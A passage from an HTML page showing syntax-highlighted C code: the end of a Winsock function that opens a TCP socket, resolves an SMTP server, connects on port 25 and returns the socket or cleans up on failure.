        </span><span class="sc11">retsocket</span><span class="sc10">=</span><span class="sc11">socket</span><span class="sc10">(</span><span class="sc11">AF_INET</span><span class="sc10">,</span><span class="sc11">SOCK_STREAM</span><span class="sc10">,</span><span class="sc11">IPPROTO_TCP</span><span class="sc10">);</span><span class="sc0">
        
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">retsocket</span><span class="sc10">!=</span><span class="sc11">INVALID_SOCKET</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">hostnt</span><span class="sc10">=</span><span class="sc11">gethostbyname</span><span class="sc10">(</span><span class="sc11">smtpserver</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">hostnt</span><span class="sc10">!=</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">sin</span><span class="sc10">.</span><span class="sc11">sin_family</span><span class="sc10">=</span><span class="sc11">AF_INET</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">sin</span><span class="sc10">.</span><span class="sc11">sin_port</span><span class="sc10">=</span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc4">25</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">//smtp
</span><span class="sc0">                </span><span class="sc11">sin</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">=*((</span><span class="sc11">LPIN_ADDR</span><span class="sc10">)*</span><span class="sc11">hostnt</span><span class="sc10">-&gt;</span><span class="sc11">h_addr_list</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">connect</span><span class="sc10">(</span><span class="sc11">retsocket</span><span class="sc10">,(</span><span class="sc11">LPSOCKADDR</span><span class="sc10">)&amp;</span><span class="sc11">sin</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr</span><span class="sc10">))==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">retsocket</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">closesocket</span><span class="sc10">(</span><span class="sc11">retsocket</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc11">WSACleanup</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span></div></body>
</html>
